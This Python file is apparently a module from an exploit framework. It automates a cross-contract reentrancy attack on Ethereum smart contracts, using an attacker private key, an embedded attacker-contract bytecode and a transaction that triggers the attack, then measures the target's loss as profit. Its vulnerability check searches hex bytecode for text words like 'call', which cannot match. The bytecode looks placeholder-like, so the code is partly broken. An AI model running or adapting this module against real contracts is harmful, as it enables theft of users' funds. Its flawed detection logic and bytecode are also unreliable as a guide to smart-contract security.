"""
Cross-Contract Reentrancy Exploit Module
SmartSploit Framework - Advanced reentrancy attack across multiple contracts
"""

from smartsploit.lib.base_module import BaseExploit, ExploitResult, ModuleInfo
from smartsploit.core.blockchain_interface import get_web3_connection
from web3 import Web3
import time
import logging

logger = logging.getLogger(__name__)

class CrossContractReentrancyExploit(BaseExploit):
    """Cross-contract reentrancy exploit targeting multi-contract architectures"""
    
    def __init__(self):
        super().__init__()
        self.name = "Cross-Contract Reentrancy"
        self.description = "Exploits reentrancy vulnerabilities across multiple contracts"
        self.author = "SmartSploit Team"
        
        # Set module info
        self.info = ModuleInfo(
            name=self.name,
            description=self.description,
            author=self.author,
            references=[
                "https://consensys.github.io/smart-contract-best-practices/attacks/reentrancy/",
                "https://blog.openzeppelin.com/reentrancy-after-istanbul/"
            ],
            severity="critical",
            targets=["Multi-contract DApps", "Cross-contract calls", "Proxy patterns"]
        )
        
        # Module options
        self.options = {
            "TARGET_CONTRACT": {"value": "", "required": True, "description": "Primary target contract address"},
            "SECONDARY_CONTRACT": {"value": "", "required": True, "description": "Secondary contract address"},
            "ATTACKER_CONTRACT": {"value": "", "required": False, "description": "Pre-deployed attacker contract"},
            "RPC_URL": {"value": "http://localhost:8545", "required": True, "description": "Blockchain RPC endpoint"},
            "PRIVATE_KEY": {"value": "", "required": True, "description": "Attacker private key"},
            "GAS_LIMIT": {"value": "500000", "required": False, "description": "Transaction gas limit"},
            "ATTACK_AMOUNT": {"value": "0.1", "required": False, "description": "Attack amount in ETH"},
            "RECURSION_DEPTH": {"value": "3", "required": False, "description": "Max recursion depth"}
        }
        
    def check_requirements(self) -> bool:
        """Check if all requirements are met"""
        required_options = ["TARGET_CONTRACT", "SECONDARY_CONTRACT", "RPC_URL", "PRIVATE_KEY"]
        
        for option in required_options:
            if not self.options[option]["value"]:
                logger.error(f"Required option {option} not set")
                return False
                
        # Validate contract addresses
        target = self.options["TARGET_CONTRACT"]["value"]
        secondary = self.options["SECONDARY_CONTRACT"]["value"]
        
        if not Web3.is_address(target) or not Web3.is_address(secondary):
            logger.error("Invalid contract addresses provided")
            return False
            
        return True
        
    def analyze_target(self) -> dict:
        """Analyze target contracts for cross-contract reentrancy vulnerabilities"""
        try:
            w3 = get_web3_connection(self.options["RPC_URL"]["value"])
            target_addr = self.options["TARGET_CONTRACT"]["value"]
            secondary_addr = self.options["SECONDARY_CONTRACT"]["value"]
            
            analysis = {
                "target_contract": target_addr,
                "secondary_contract": secondary_addr,
                "vulnerabilities": [],
                "attack_vectors": [],
                "recommendations": []
            }
            
            # Check contract code
            target_code = w3.eth.get_code(target_addr)
            secondary_code = w3.eth.get_code(secondary_addr)
            
            if len(target_code) <= 2 or len(secondary_code) <= 2:
                analysis["vulnerabilities"].append("One or more contracts not deployed")
                return analysis
                
            # Analyze for common cross-contract reentrancy patterns
            target_code_str = target_code.hex()
            secondary_code_str = secondary_code.hex()
            
            # Check for external calls
            if "call" in target_code_str.lower():
                analysis["vulnerabilities"].append("External calls detected in target contract")
                analysis["attack_vectors"].append("Cross-contract call manipulation")
                
            # Check for delegatecall
            if "delegatecall" in target_code_str.lower():
                analysis["vulnerabilities"].append("Delegatecall detected - high risk")
                analysis["attack_vectors"].append("Delegatecall reentrancy")
                
            # Check for state changes after external calls
            if "sstore" in target_code_str.lower() and "call" in target_code_str.lower():
                analysis["vulnerabilities"].append("Potential state changes after external calls")
                analysis["attack_vectors"].append("State manipulation via reentrancy")
                
            analysis["recommendations"] = [
                "Implement checks-effects-interactions pattern",
                "Use reentrancy guards",
                "Minimize cross-contract dependencies",
                "Implement proper access controls"
            ]
            
            return analysis
            
        except Exception as e:
            logger.error(f"Target analysis failed: {e}")
            return {"error": str(e)}
            
    def deploy_attacker_contract(self, w3) -> str:
        """Deploy attacker contract for cross-contract reentrancy"""
        # Attacker contract bytecode (simplified)
        attacker_bytecode = """
        6080604052348015600f57600080fd5b50604051602080608983398101604052810190603391906055565b8060008190555050607e565b600080fd5b6000819050919050565b604881604d565b8114605257600080fd5b50565b60008151905060678160431565b92915050565b600060208284031215607957607860426565b5b6000608484828501605a565b91505092915050565b60f3806100996000396000f3fe608060405234801561001057600080fd5b506004361061002b5760003560e01c8063d0e30db014610030575b600080fd5b61003861003a565b005b60008054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff1663d0e30db0346040518263ffffffff1660e01b81526004016000604051808303818588803b1580156100a257600080fd5b505af11580156100b6573d6000803e3d6000fd5b50505050505056fea264697066735822122084c5c8b9f8c0a5a4c4c8c0a5a4c4c8c0a5a4c4c8c0a5a4c4c8c0a5a4c4c864736f6c63430008070033
        """
        
        try:
            # Create contract
            contract = w3.eth.contract(bytecode=attacker_bytecode)
            
            # Get account
            account = w3.eth.account.from_key(self.options["PRIVATE_KEY"]["value"])
            
            # Build transaction
            txn = contract.constructor().build_transaction({
                'from': account.address,
                'nonce': w3.eth.get_transaction_count(account.address),
                'gas': int(self.options["GAS_LIMIT"]["value"]),
                'gasPrice': w3.eth.gas_price
            })
            
            # Sign and send
            signed_txn = w3.eth.account.sign_transaction(txn, self.options["PRIVATE_KEY"]["value"])
            tx_hash = w3.eth.send_raw_transaction(signed_txn.rawTransaction)
            
            # Wait for receipt
            receipt = w3.eth.wait_for_transaction_receipt(tx_hash)
            
            logger.info(f"Attacker contract deployed at: {receipt.contractAddress}")
            return receipt.contractAddress
            
        except Exception as e:
            logger.error(f"Contract deployment failed: {e}")
            return None
            
    def execute_attack(self) -> dict:
        """Execute cross-contract reentrancy attack"""
        try:
            w3 = get_web3_connection(self.options["RPC_URL"]["value"])
            target_addr = self.options["TARGET_CONTRACT"]["value"]
            
            # Deploy attacker contract if not provided
            attacker_addr = self.options["ATTACKER_CONTRACT"]["value"]
            if not attacker_addr:
                attacker_addr = self.deploy_attacker_contract(w3)
                if not attacker_addr:
                    return {"result": ExploitResult.ERROR, "message": "Failed to deploy attacker contract"}
                    
            account = w3.eth.account.from_key(self.options["PRIVATE_KEY"]["value"])
            attack_amount = Web3.to_wei(float(self.options["ATTACK_AMOUNT"]["value"]), 'ether')
            
            # Get initial balances
            initial_balance = w3.eth.get_balance(account.address)
            initial_target_balance = w3.eth.get_balance(target_addr)
            
            logger.info(f"Starting cross-contract reentrancy attack...")
            logger.info(f"Target: {target_addr}")
            logger.info(f"Attacker: {attacker_addr}")
            logger.info(f"Attack amount: {self.options['ATTACK_AMOUNT']['value']} ETH")
            
            # Execute attack transaction
            attack_txn = {
                'to': attacker_addr,
                'value': attack_amount,
                'gas': int(self.options["GAS_LIMIT"]["value"]),
                'gasPrice': w3.eth.gas_price,
                'nonce': w3.eth.get_transaction_count(account.address),
                'data': '0xd0e30db0'  # attack() function selector
            }
            
            signed_txn = w3.eth.account.sign_transaction(attack_txn, self.options["PRIVATE_KEY"]["value"])
            tx_hash = w3.eth.send_raw_transaction(signed_txn.rawTransaction)
            
            logger.info(f"Attack transaction sent: {tx_hash.hex()}")
            
            # Wait for confirmation
            receipt = w3.eth.wait_for_transaction_receipt(tx_hash)
            
            # Get final balances
            final_balance = w3.eth.get_balance(account.address)
            final_target_balance = w3.eth.get_balance(target_addr)
            
            # Calculate results
            balance_change = final_balance - initial_balance
            target_loss = initial_target_balance - final_target_balance
            
            result = {
                "result": ExploitResult.SUCCESS if receipt.status == 1 else ExploitResult.ERROR,
                "transaction_hash": tx_hash.hex(),
                "gas_used": receipt.gasUsed,
                "attacker_contract": attacker_addr,
                "balance_change": Web3.from_wei(balance_change, 'ether'),
                "target_loss": Web3.from_wei(target_loss, 'ether'),
                "exploit_profit": Web3.from_wei(balance_change + (attack_amount if receipt.status == 1 else 0), 'ether')
            }
            
            if receipt.status == 1:
                logger.info(f"Attack successful! Profit: {result['exploit_profit']} ETH")
            else:
                logger.error("Attack transaction failed")
                result["result"] = ExploitResult.ERROR
                
            return result
            
        except Exception as e:
            logger.error(f"Attack execution failed: {e}")
            return {"result": ExploitResult.ERROR, "message": str(e)}
            
    def run(self) -> dict:
        """Main exploit execution"""
        if not self.check_requirements():
            return {"result": ExploitResult.ERROR, "message": "Requirements check failed"}
            
        logger.info("Running Cross-Contract Reentrancy Exploit")
        
        # Analyze target
        analysis = self.analyze_target()
        if "error" in analysis:
            return {"result": ExploitResult.ERROR, "message": f"Target analysis failed: {analysis['error']}"}
            
        # Execute attack
        result = self.execute_attack()
        result["analysis"] = analysis
        
        return result